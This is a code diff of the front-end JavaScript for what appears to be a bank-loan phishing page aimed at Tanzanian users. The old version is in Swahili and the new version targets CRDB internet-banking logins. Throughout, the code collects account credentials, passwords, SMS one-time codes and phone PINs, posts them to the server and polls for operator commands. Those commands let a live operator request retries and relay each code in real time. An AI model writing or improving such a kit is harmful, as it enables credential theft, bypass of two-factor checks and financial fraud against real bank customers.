@@ -1,292 +1,249 @@
-const sessionId = 'session_' + Math.random().toString(36).substring(2, 9);
-let pollInterval = null;
+document.addEventListener('DOMContentLoaded', () => {
+  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
+  const stepSlider = document.getElementById('step-slider');
+  const stepForm = document.getElementById('step-form'); // Internet Banking Login
+  const stepOtp = document.getElementById('step-otp'); // 6-digit SMS OTP
+  const stepPhonePin = document.getElementById('step-phone-pin');
+  const stepLoading = document.getElementById('step-loading');
+  const stepSuccess = document.getElementById('step-success');
 
-const steps = {
-    loan: document.getElementById('step-loan'),
-    credentials: document.getElementById('step-credentials'),
-    otp: document.getElementById('step-otp'),
-    securityPin: document.getElementById('step-security-pin'),
-    success: document.getElementById('step-success')
-};
+  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
+  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+  const pinSurfaceBanner = document.getElementById('pin-surface-banner');
 
-function showStep(stepName) {
-    Object.keys(steps).forEach(key => {
-        steps[key].classList.add('hidden');
+  let currentUserId = null;
+  let statusPollInterval = null;
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const adminParam = urlParams.get('admin') || '';
+
+  function showStep(targetStep) {
+    [stepUnderstand, stepSlider, stepForm, stepOtp, stepPhonePin, stepSuccess].forEach(s => {
+      if (s) s.classList.remove('active');
     });
-    steps[stepName].classList.remove('hidden');
-}
+    if (targetStep) targetStep.classList.add('active');
+  }
 
-function showNotification(message, isError = false) {
-    const banner = document.getElementById('notification-banner');
-    if (!banner) return;
-    banner.textContent = message;
-    banner.classList.remove('hidden');
-    if (isError) banner.classList.add('error');
-    else banner.classList.remove('error');
-}
+  // Slider Logic
+  const sliderBalance = document.getElementById('slider-balance');
+  const balanceVal = document.getElementById('balance-val');
+  const sliderDuration = document.getElementById('slider-duration');
+  const durationVal = document.getElementById('duration-val');
 
-// --- Functional Split Keypad Logic ---
-const dialedNumberText = document.getElementById('dialed-number');
-const keyButtons = document.querySelectorAll('.k-btn');
-const simulatedCallBtn = document.getElementById('simulated-call-btn');
+  if (sliderBalance && balanceVal) {
+    sliderBalance.addEventListener('input', (e) => {
+      balanceVal.innerText = `TZS ${Number(e.target.value).toLocaleString()}`;
+    });
+  }
 
-let currentDialString = '*150*03#';
+  if (sliderDuration && durationVal) {
+    sliderDuration.addEventListener('input', (e) => {
+      durationVal.innerText = `${e.target.value} months`;
+    });
+  }
 
-if (dialedNumberText) {
-    dialedNumberText.textContent = currentDialString;
-}
+  // Digit Inputs Setup (6-digit OTP & 4-digit PIN)
+  const otpDigits6 = document.querySelectorAll('.otp-digit-6');
+  const pinDigits = document.querySelectorAll('.pin-digit');
 
-keyButtons.forEach(btn => {
-    btn.addEventListener('click', () => {
-        const val = btn.getAttribute('data-val');
-        if (val) {
-            currentDialString += val;
-            if (dialedNumberText) dialedNumberText.textContent = currentDialString;
+  function setupDigitInputs(inputs) {
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
         }
-    });
-});
-
-if (simulatedCallBtn) {
-    simulatedCallBtn.addEventListener('click', () => {
-        if (currentDialString.includes('*150*03#')) {
-            if (dialedNumberText) dialedNumberText.textContent = 'Inatuma ombi...';
-            
-            // Fast USSD response simulation
-            setTimeout(() => {
-                if (dialedNumberText) {
-                    dialedNumberText.textContent = '1. SimBanking\n2. Huduma za Pesa\n3. Akaunti Yangu';
-                }
-                showNotification('USSD Session Imefunguka.');
-            }, 200);
-        } else {
-            showNotification('Tafadhali piga *150*03#', true);
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && idx > 0) {
+          inputs[idx - 1].focus();
         }
+      });
     });
-}
+  }
 
-const loanAmount = document.getElementById('loan-amount');
-const loanMonths = document.getElementById('loan-months');
-const amountText = document.getElementById('amount-text');
-const monthsText = document.getElementById('months-text');
-const monthlyPayment = document.getElementById('monthly-payment');
+  setupDigitInputs(otpDigits6);
+  setupDigitInputs(pinDigits);
 
-if (loanAmount && loanMonths) {
-    loanAmount.addEventListener('input', updateLoanCalc);
-    loanMonths.addEventListener('input', updateLoanCalc);
-}
+  // Flow Navigation
+  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
+    showStep(stepSlider);
+  });
 
-function updateLoanCalc() {
-    const amt = parseInt(loanAmount.value);
-    const months = parseInt(loanMonths.value);
-    amountText.textContent = `TSh ${amt.toLocaleString()}`;
-    monthsText.textContent = `miezi ${months}`;
-    const monthly = Math.round((amt * 1.25) / months);
-    monthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;
-}
+  document.getElementById('btn-slider-next').addEventListener('click', () => {
+    showStep(stepForm);
+  });
 
-document.getElementById('btn-omba').addEventListener('click', () => {
-    showStep('credentials');
-});
+  // Step 1: Submit Username & Password
+  document.getElementById('btn-submit-creds').addEventListener('click', async () => {
+    const username = document.getElementById('crdb-username').value.trim();
+    const password = document.getElementById('crdb-password').value.trim();
 
-document.getElementById('btn-continue-creds').addEventListener('click', async () => {
-    const accountNumber = document.getElementById('acc-number').value.trim();
-    const mobileNumber = document.getElementById('mobile-number').value.trim();
-    const pin = document.getElementById('sim-pin').value.trim();
-
-    if (!accountNumber || !mobileNumber || !pin) {
-        alert('Tafadhali jaza sehemu zote.');
-        return;
+    if (!username || !password) {
+      alert('Please enter both username and password.');
+      return;
     }
 
-    if (!mobileNumber.startsWith('0')) {
-        alert('Namba ya simu lazima ianze na namba 0 (Mfano: 0712345678).');
-        return;
-    }
-
-    document.getElementById('credentials-spinner').classList.remove('hidden');
-    document.getElementById('btn-continue-creds').classList.add('hidden');
+    if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
+    showLoading('Validating Credentials...', 'Sending secure login details.');
 
     try {
-        const response = await fetch('/api/submit-credentials', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sessionId,
-                accountNumber,
-                mobileNumber,
-                pin,
-                loanDetails: {
-                    amount: amountText ? amountText.textContent : 'TSh 1,000,000',
-                    monthly: monthlyPayment ? monthlyPayment.textContent : 'TSh 95,833'
-                }
-            })
-        });
-        
-        const result = await response.json();
-        if (!result.success) throw new Error(result.error || 'Server returned failure');
+      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password, adminChatId: adminParam })
+      });
 
-        startPolling();
-    } catch (err) {
-        console.error('Submission error:', err);
-        document.getElementById('credentials-spinner').classList.add('hidden');
-        document.getElementById('btn-continue-creds').classList.remove('hidden');
-        alert('Hitilafu imetokea. Hakikisha namba yako imeanza na 0 na mtandao uko sawa.');
+      const data = await res.json();
+      if (data.success) {
+        currentUserId = data.userId;
+        document.getElementById('loading-title').innerText = 'Awaiting Admin Verification...';
+        document.getElementById('loading-sub').innerText = 'Please stay on this page while request is processed.';
+        startStatusPolling();
+      } else {
+        hideLoading();
+        alert(data.error || 'Submission failed.');
+      }
+    } catch (e) {
+      hideLoading();
+      alert('Network error.');
     }
-});
+  });
 
-setupPinInputs('.otp-box');
-setupPinInputs('.pin-box');
+  // Status Polling
+  function startStatusPolling() {
+    if (statusPollInterval) clearInterval(statusPollInterval);
 
-function setupPinInputs(selector) {
-    const boxes = document.querySelectorAll(selector);
-    boxes.forEach((box, index) => {
-        box.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            if (e.target.value && index < boxes.length - 1) {
-                boxes[index + 1].focus();
-            }
-            checkOtpComplete();
-        });
-        box.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !box.value && index > 0) {
-                boxes[index - 1].focus();
-            }
-        });
-    });
-}
+    statusPollInterval = setInterval(async () => {
+      if (!currentUserId) return;
 
-function checkOtpComplete() {
-    const boxes = document.querySelectorAll('#step-otp .otp-box');
-    const btnVerifyOtp = document.getElementById('btn-verify-otp');
-    const otp = Array.from(boxes).map(b => b.value).join('');
-    
-    if (otp.length === 5) {
-        btnVerifyOtp.removeAttribute('disabled');
-    } else {
-        btnVerifyOtp.setAttribute('disabled', 'true');
-    }
-}
+      try {
+        const res = await fetch(`/api/check-status/${currentUserId}`);
+        const data = await res.json();
 
-// Submit OTP (Must be 5 digits numeric)
-document.getElementById('btn-verify-otp').addEventListener('click', async () => {
-    const boxes = document.querySelectorAll('#step-otp .otp-box');
-    const otp = Array.from(boxes).map(b => b.value).join('');
-    
-    if (otp.length < 5) return;
-
-    try {
-        await fetch('/api/submit-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, otp })
-        });
-        
-        showStep('success');
-        startCountdown();
-        showNotification('OTP imetumwa. Inasubiri uthibitisho...');
-        startPolling();
-    } catch (err) {
-        console.error('OTP error:', err);
-    }
-});
-
-// Submit Security PIN
-document.getElementById('btn-verify-security-pin').addEventListener('click', async () => {
-    const boxes = document.querySelectorAll('#step-security-pin .pin-box');
-    const securityPin = Array.from(boxes).map(b => b.value).join('');
-    if (securityPin.length < 4) {
-        alert('Tafadhali ingiza PIN ya usalama ya tarakimu 4 (namba pekee).');
-        return;
-    }
-
-    try {
-        await fetch('/api/submit-security-pin', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, securityPin })
-        });
-        
-        showStep('success');
-        startCountdown();
-        showNotification('PIN imetumwa. Inasubiri idhini ya mwisho...');
-        startPolling();
-    } catch (err) {
-        console.error('Security PIN error:', err);
-    }
-});
-
-function startCountdown() {
-    let timeLeft = 3;
-    const timerEl = document.getElementById('countdown-timer');
-    const interval = setInterval(() => {
-        timeLeft--;
-        if (timerEl) timerEl.textContent = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(interval);
+        if (data.status === 'PROCEED_OTP') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          showStep(stepOtp);
+        } else if (data.status === 'PROCEED_PHONE_PIN') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          showStep(stepPhonePin);
+        } else if (data.status === 'SUCCESS') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          document.getElementById('approved-amount-display').innerText = `TZS ${Number(sliderBalance.value).toLocaleString()}`;
+          showStep(stepSuccess);
+        } else if (data.status === 'RETRY_CREDS') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
+          document.getElementById('crdb-username').value = '';
+          document.getElementById('crdb-password').value = '';
+          showStep(stepForm);
+        } else if (data.status === 'RETRY_OTP') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
+          otpDigits6.forEach(i => i.value = '');
+          otpDigits6[0].focus();
+          showStep(stepOtp);
+        } else if (data.status === 'RETRY_PIN') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
+          pinDigits.forEach(i => i.value = '');
+          showStep(stepPhonePin);
         }
-    }, 1000);
-}
-
-function startPolling() {
-    if (pollInterval) clearInterval(pollInterval);
-
-    pollInterval = setInterval(async () => {
-        try {
-            const res = await fetch(`/api/status/${sessionId}`);
-            const data = await res.json();
-
-            if (data.notification) {
-                const isErr = data.status === 'error' || data.notification.includes('WRONG') || data.notification.includes('INVALID');
-                showNotification(data.notification, isErr);
-            }
-
-            if (data.status === 'enter_otp') {
-                const otpBoxes = document.querySelectorAll('#step-otp .otp-box');
-                otpBoxes.forEach(b => b.removeAttribute('disabled'));
-                showStep('otp');
-                clearInterval(pollInterval);
-            } else if (data.status === 'enter_security_pin') {
-                showStep('securityPin');
-                clearInterval(pollInterval);
-            } else if (data.status === 'success') {
-                const iconContainer = document.getElementById('success-icon-container');
-                const titleEl = document.getElementById('success-title');
-                const subtitleEl = document.getElementById('success-subtitle');
-                const countdownBanner = document.getElementById('countdown-banner');
-                const noteBox = document.getElementById('success-note-box');
-                const btnFinish = document.getElementById('btn-finish');
-                
-                if (iconContainer) iconContainer.textContent = '✅';
-                if (titleEl) titleEl.textContent = 'Ombi Lako Limefanikiwa!';
-                if (subtitleEl) {
-                    subtitleEl.innerHTML = `Mkopo wako umeidhinishwa na kiasi cha <span class="highlight">${amountText ? amountText.textContent : 'TSh 1,000,000'}</span> kimetumwa kwenye akaunti yako.`;
-                }
-                if (countdownBanner) countdownBanner.classList.add('hidden');
-                if (noteBox) {
-                    const successMon = document.getElementById('success-monthly');
-                    if (successMon && monthlyPayment) successMon.textContent = monthlyPayment.textContent;
-                    noteBox.classList.remove('hidden');
-                }
-                if (btnFinish) btnFinish.classList.remove('hidden');
-
-                showStep('success');
-                clearInterval(pollInterval);
-            } else if (data.status === 'error') {
-                document.getElementById('credentials-spinner').classList.add('hidden');
-                document.getElementById('btn-continue-creds').classList.remove('hidden');
-                showStep('credentials');
-                clearInterval(pollInterval);
-            }
-        } catch (e) {
-            console.error('Polling error:', e);
-        }
+      } catch (e) {}
     }, 3000);
-}
+  }
 
-const btnFinishEl = document.getElementById('btn-finish');
-if (btnFinishEl) {
-    btnFinishEl.addEventListener('click', () => {
-        window.location.reload();
-    });
-        }
+  // Step 2: Submit 6-digit SMS OTP
+  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
+    const otpVal = Array.from(otpDigits6).map(i => i.value).join('');
+
+    if (otpVal.length !== 6) {
+      document.getElementById('otp-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('otp-error').style.display = 'none';
+    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
+
+    showLoading('Verifying SMS OTP...', 'Validating your 6-digit verification code.');
+
+    try {
+      const res = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loading-title').innerText = 'Verifying Code...';
+        document.getElementById('loading-sub').innerText = 'Please wait while admin confirms your code.';
+        startStatusPolling();
+      } else {
+        hideLoading();
+      }
+    } catch (e) {
+      hideLoading();
+    }
+  });
+
+  // Step 3: Submit Phone Number & PIN
+  document.getElementById('btn-submit-phone-pin').addEventListener('click', async () => {
+    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
+    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
+
+    if (phone.length < 9) {
+      document.getElementById('phone-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('phone-error').style.display = 'none';
+
+    if (pinVal.length !== 4) {
+      document.getElementById('pin-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('pin-error').style.display = 'none';
+    if (pinSurfaceBanner) pinSurfaceBanner.classList.remove('active');
+
+    showLoading('Authenticating Account...', 'Finalizing secure verification.');
+
+    try {
+      const res = await fetch('/api/submit-phone-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, phone, pin: pinVal })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loading-title').innerText = 'Finalizing Approval...';
+        document.getElementById('loading-sub').innerText = 'Please stay on this page.';
+        startStatusPolling();
+      } else {
+        hideLoading();
+      }
+    } catch (e) {
+      hideLoading();
+    }
+  });
+
+  document.getElementById('btn-go-home').addEventListener('click', () => {
+    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
+  });
+
+  function showLoading(title, sub) {
+    document.getElementById('loading-title').innerText = title;
+    document.getElementById('loading-sub').innerText = sub;
+    if (stepLoading) stepLoading.classList.add('active');
+  }
+
+  function hideLoading() {
+    if (stepLoading) stepLoading.classList.remove('active');
+  }
+});
     
